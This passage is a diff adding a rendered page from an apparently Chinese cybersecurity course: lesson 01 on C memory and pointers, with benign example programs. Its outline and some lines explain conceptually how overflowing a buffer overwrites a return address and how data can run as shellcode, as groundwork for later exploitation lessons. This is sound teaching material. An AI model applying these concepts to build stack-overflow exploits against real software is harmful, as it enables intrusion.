+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 指针——存地址的变量
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 指针——存地址的变量">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：快递单上的收件地址
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 数组和指针——其实是一回事
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 数组和指针——其实是一回事">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：街道门牌号系统
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        图解：数组在内存中的布局
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-stackheap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 📌 栈（Stack）和堆（Heap）——程序的两种内存
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 📌 栈（Stack）和堆（Heap）——程序的两种内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：餐厅洗盘子 vs 仓库取货
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理：栈帧结构
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔥 关键洞察：为什么栈溢出能控制程序？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码：一个故意栈溢出的程序
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 📌 网安必知的几个危险函数
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 📌 网安必知的几个危险函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：不看刻度线的杯子
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 头号通缉犯完整档案
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="💣 头号通缉犯完整档案">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-gets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. gets() —— 永远的罪魁祸首
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-strcpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. strcpy() —— 最常用的地雷
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-strcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. strcat() —— 拼接时溢出
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-sprintf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. sprintf() —— 格式化溢出
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-scanfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. scanf("%s") —— 默认不限制
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ 记住一条规律
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 双栏对比：每种函数的"被黑"版本和"安全"版本
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-gdb-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. GDB 调试——20 分钟上手
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. GDB 调试——20 分钟上手">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：给程序装监控摄像头
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 安装和启动
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 GDB 核心命令实操
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gdb_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验：用 GDB 看看栈上的"返回地址"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. 🧪 综合实验：用 GDB 观察栈溢出
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. 🧪 综合实验：用 GDB 观察栈溢出">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验准备
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验步骤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验报告（写在你自己的笔记里）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. 自己写一个内存查看器
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧵 实际案例串联
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🧵 实际案例串联">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#12001-code-red" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 1：2001 年 Code Red 蠕虫
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22014-heartbleed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 2：2014 年 Heartbleed（心脏滴血）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 3：你手机上的每个 App
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 复习自检
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎬 推荐视频
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_36" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔗 知识串联
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔗 知识串联">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#02-python-md" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        下一步：打开 02-Python-安全工具速通.md
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="01-c">01 · C语言——指针与内存<a class="headerlink" href="#01-c" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>⏪ 前置知识：</strong> 无（这是第一课，你不需要任何基础）
+<strong>⏩ 学完后解锁：</strong> 计算机体系（03）、二进制安全（07）
+<strong>⏱ 预计用时：</strong> 5-6 小时（建议分 3-4 天学完）
+<strong>🎯 核心目标：</strong> 理解"程序里的数据放哪、怎么找、找错了会怎样"——这是理解一切安全漏洞的起点</p>
+</blockquote>
+<hr />
+<h2 id="_1">🚪 门前检查<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>在开始本章之前，确认你：</strong></p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 有一台能写代码的电脑（Windows/Mac/Linux 都行）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 装了 GCC 编译器（终端输入 <code>gcc --version</code> 试试）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道怎么在终端里运行一个程序（比如 <code>./a.out</code>）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 做好了"会遇到困难"的心理准备——指针是 C 语言最陡的学习曲线，每个人第一遍都看不懂，这完全正常</li>
+</ul>
+<blockquote>
+<p><strong>如果上面有任何一项是"否"，先去准备好再回来。</strong> 装编译器的方法：Windows 搜索 "MinGW 安装教程" 或安装 WSL；Mac 装 Xcode Command Line Tools（<code>xcode-select --install</code>）；Linux 自带。</p>
+</blockquote>
+<hr />
+<h2 id="_2">📊 本章进度<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>知识点</th>
+<th style="text-align: center;">预计用时</th>
+<th style="text-align: center;">状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.1</td>
+<td>内存柜子模型</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.2</td>
+<td>指针——存地址的变量</td>
+<td style="text-align: center;">45 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.3</td>
+<td>数组与指针的关系</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.4</td>
+<td>📌 栈与堆——程序的两种内存</td>
+<td style="text-align: center;">60 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.5</td>
+<td>📌 危险函数清单（双栏对比）</td>
+<td style="text-align: center;">45 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.6</td>
+<td>GDB 调试 20 分钟上手</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.7</td>
+<td>🧪 综合实验：用 GDB 观察栈溢出</td>
+<td style="text-align: center;">45 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>1.8</td>
+<td>自己写一个内存查看器</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+</tbody>
+</table>
+<p><strong>掌握自检：</strong> <code>[ ]</code> 能画出栈帧结构图，准确标出 buf、返回地址、rbp 的位置，解释为什么 buf 越界会覆盖返回地址</p>
+<hr />
+<h2 id="1">1. 内存到底是什么？<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
+<h3 id="_3">🏪 生活场景：图书馆的存包柜<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>你去图书馆自习，门口有一排存包柜。你把书包放进 15 号柜，拿到一把写着"15"的钥匙。出来的时候，你凭钥匙上的号码找到柜子，取出书包。</p>
+<p><strong>这个场景里藏着内存的所有关键概念：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>存包柜系统                         计算机内存
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>─────────────────────────────────────────────────
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>一排柜子，每个有编号(1~200)    =  内存是一个字节数组，每个字节有地址
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>你的东西占了 3 个柜子(15/16/17) =  一个 int 变量占 4 个连续的字节
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>钥匙上只写&quot;15&quot;——首柜编号       =  指针存的是起始地址
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>你把钥匙给人=告诉别人&quot;地址&quot;     =  传指针 = 传地址
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>捡到钥匙的人能开柜=任意访问      =  有地址就能读写那块内存
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>拿错钥匙开了别人的柜子           =  ★ 这就是漏洞的本质！
+</code></pre></div>
+<p><strong>来，把这个场景具体化：</strong></p>
+<p>你存了一个书包，占了 15、16、17 号三个柜子。管理员给你一把写着"15"的钥匙（这就是指针——你不需要知道占了几个柜子，只需要知道从哪开始）。</p>
+<p>另一个人来存东西。他应该用 18 号柜。但程序出错了——他开始往 16 号柜里塞东西（数组越界！）。你的书包有一半被他的东西挤坏了。</p>
+<p><strong>这就是 C 语言里每天都在发生的事：</strong> 一段代码拿到了内存地址，然后往那儿写数据。如果它写多了、写偏了，就覆盖了别人的数据。如果"别人"恰好是程序的控制信息（比如返回地址），黑客就能控制程序的执行流程。</p>
+<h3 id="_4">🔍 技术原理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>每个程序运行的时候，操作系统分配给它一大块内存。这块内存被分成<strong>字节</strong>——每个字节是 8 个比特，能存 0~255 之间的一个数。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>内存地址（通常用十六进制表示）：
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>地址:  0x1000  0x1001  0x1002  0x1003  0x1004  0x1005  0x1006  0x1007
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>      ┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>      │  65   ││  66   ││  67   ││   0   ││  10   ││   0   ││   0   ││   0   │
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>      │ &#39;A&#39;   ││ &#39;B&#39;   ││ &#39;C&#39;   ││ &#39;\0&#39;  ││ (int) ││       ││       ││       │
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>      └───────┘└───────┘└───────┘└───────┘└───────┘└───────┘└───────┘└───────┘
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>      数组 &quot;ABC&quot; (4字节)               整数 10 (4字节，小端序)
+</code></pre></div>
+<p><strong>关键事实：</strong>
+- 内存地址只是一个数字——就像柜子编号只是一个数字
+- 不同类型的数据占用不同数量的字节：char = 1 字节，int = 4 字节，double = 8 字节
+- 程序通过地址来读写——CPU 说"把 0x1004 处的 4 个字节读出来"
+- <strong>内存里指令和数据没有区别</strong>——都是一堆字节。如果你把数据当成指令送给 CPU 执行，CPU 照样执行（shellcode 的原理！）</p>
+<h3 id="_5">💻 动手写代码<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="p">;</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">42</span><span class="p">;</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="kt">double</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3.14</span><span class="p">;</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="c1">// %p 打印地址（指针的值）</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="c1">// &amp; 是&quot;取地址&quot;运算符</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;变量 c 的值: %c, 地址: %p, 占用: %zu 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">c</span><span class="p">));</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;变量 i 的值: %d, 地址: %p, 占用: %zu 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;变量 d 的值: %f, 地址: %p, 占用: %zu 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">d</span><span class="p">));</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="p">}</span>
+</code></pre></div>
+<p>保存为 <code>memory.c</code>，运行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>memory<span class="w"> </span>memory.c
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>./memory
+</code></pre></div>
+<p>你会看到类似这样的输出：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>变量 c 的值: A, 地址: 0x7ffd8e3f4a1f, 占用: 1 字节
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>变量 i 的值: 42, 地址: 0x7ffd8e3f4a18, 占用: 4 字节
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>变量 d 的值: 3.140000, 地址: 0x7ffd8e3f4a10, 占用: 8 字节
+</code></pre></div>
+<p><strong>注意看地址！</strong> 在我的机器上，d 的地址最小（0x...10），i 在它上面 8 字节（0x...18），c 又在上面 1 字节。<strong>局部变量在栈上从高地址向低地址排列。</strong></p>
+<h3 id="_6">🧪 小实验<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>把上面的代码改一下，在每个变量前后各加一个变量，看看地址是怎么变化的：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">before</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">99</span><span class="p">;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="p">;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="kt">int</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1">// 打印 before、c、after 的地址</span>
+</code></pre></div>
+<p><strong>观察：</strong> 它们的地址不是连续的！编译器会在变量之间留"空隙"（对齐 padding）。这就是为什么有时候越界几个字节不一定会马上崩溃——你覆盖的是"空隙"。</p>
+<h3 id="_7">⚠️ 常见误区<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>❌ <strong>误区：</strong> "内存地址是随机的，每次运行都不一样"
+✅ <strong>真相：</strong> 现代系统有 ASLR（地址空间布局随机化），但<strong>局部变量之间的相对位置是固定的</strong>。每次运行，所有地址一起随机偏移，但 c 和 i 之间的距离不变。</p>
+</blockquote>
+<hr />
+<h2 id="2">2. 指针——存地址的变量<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
+<h3 id="_8">🏪 生活场景：快递单上的收件地址<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>你要给朋友寄一个包裹。你不需要把朋友本人塞进快递箱——你只需要知道他的<strong>地址</strong>。快递员根据地址找到他，把包裹交给他。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>普通变量 a = 10
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    → 你手里有 10 块钱（直接拥有值）
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>指针 p = &amp;a
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    → 你手里有一张写着&quot;a 住在 0x7fff1234&quot;的纸条（拥有地址）
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    → 想用 a 的值？按纸条上的地址去找 → *p
+</code></pre></div>
+<p><strong>为什么叫"指针"？</strong> 因为它不存数据本身，而是"指向"数据所在的位置——就像路标指向"前方 500 米厕所"，路标本身不是厕所。</p>
+<h3 id="_9">🔍 技术原理<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span><span class="w">        </span><span class="c1">// a 是一个 int 变量，存的是 10</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">;</span><span class="w">       </span><span class="c1">// p 是一个&quot;指向 int 的指针&quot;，存的是 a 的地址</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1">// 三个关键符号：</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1">// &amp;a  → &quot;取地址&quot;——问&quot;a 住在哪？&quot;返回 a 的地址</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1">// p   → 指针变量，里面存的就是地址</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1">// *p  → &quot;解引用&quot;——问&quot;p 指的地址里存了什么？&quot;去那个地址取出值</span>
+</code></pre></div>
+<p><strong>图解：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>      变量 a (int, 值=10)              变量 p (int*, 值=0x7fff1234)
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    ┌─────────────────────┐         ┌─────────────────────┐
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    │         10          │ ←────── │     0x7fff1234      │
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    └─────────────────────┘         └─────────────────────┘
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>    地址: 0x7fff1234                 地址: 0x7fff1238
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>&amp;a → &quot;a 的门牌号是多少？&quot; → 0x7fff1234
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>*p → &quot;按 p 里的门牌号去找，屋子里有什么？&quot; → 10
+</code></pre></div>
+<h3 id="_10">💻 动手写代码<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
